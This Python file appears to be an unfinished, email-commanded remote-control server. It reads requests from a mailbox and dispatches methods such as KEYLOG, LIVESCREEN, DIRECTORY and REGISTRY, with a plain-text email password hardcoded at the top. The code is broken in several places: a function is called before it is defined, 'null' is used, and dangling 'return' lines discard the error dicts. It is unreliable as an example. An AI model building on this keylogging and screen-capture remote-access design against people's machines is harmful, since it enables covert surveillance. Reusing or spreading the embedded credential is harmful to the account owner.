from EmailTemplate import EmailTemplate 
from Controls.RegistryControl import RegistryControl 

if __name__ == "__main__":
    gmail = EmailTemplate("theanh@canhcam.com", "Theanh!23")

    while(1):
        request = gmail.Receive()

        response = HandleRequest(request)

        # if(response):


def HandleRequest(self, request):
    try:
        if not request:
            return null

        method = request.body.method

        if( method != "KEYLOG"
            and method != "SD_LO"
            and method != "LIVESCREEN"
            and method != "APP_PRO"
            and method != "MAC"
            and method != "DIRECTORY"
            and method != "REGISTRY"
            and method != "QUIT"):
            return 
            {
                "isSuccess": False,
                "message": "No method found with the " + method 
            }

        data = request.body.data

        if(method == "REGISTRY"):
            return RegistryControl.RegistryHandle(data)
    except:
        return 
        {
            "isSuccess": False,
            "message": "Failed to process from the server. Please try one more time."
        }
